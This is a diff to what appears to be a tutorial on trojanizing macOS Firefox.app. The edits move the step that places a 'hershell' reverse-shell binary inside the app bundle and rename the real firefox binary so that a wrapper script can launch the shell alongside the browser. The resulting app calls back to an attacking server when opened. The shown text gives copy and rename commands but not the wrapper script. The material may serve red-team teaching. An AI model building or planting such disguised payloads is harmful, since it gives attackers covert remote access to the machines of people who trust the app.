@@ -90,14 +90,14 @@ Copy Firefox.app:
 cp -r /Applications/Firefox.app /tmp/Firefox-trojan.app
 ```
 
+Place the `hershell` binary that you created on the attacking server in `/tmp/Firefox-trojan.app/Contents/MacOS`.
+
 Rename the original Firefox binary file:
 
 ```bash
 cd /tmp/Firefox-trojan.app/Contents/MacOS
-cp firefox firefox.orig
+mv firefox firefox.orig
 ```
-
-Place the `hershell` binary that you created on the attacking server in `/tmp/Firefox-trojan.app/Contents/MacOS`.
 
 Now create a shell script in place of the `firefox` binary that will run hershell and then will run the original `firefox` binary:
 
@@ -126,3 +126,4 @@ This method will use the `screen` command to run hershell in the background with
 When the Firefox-trojan.app is opened, it should attempt to create a reverse shell with the attacking server that is listening for a connection.
 
 ![alt text](https://raw.githubusercontent.com/heywoodlh/the-empire.systems/master/images/trojan-firefox.png "Trojanized Firefox")
+
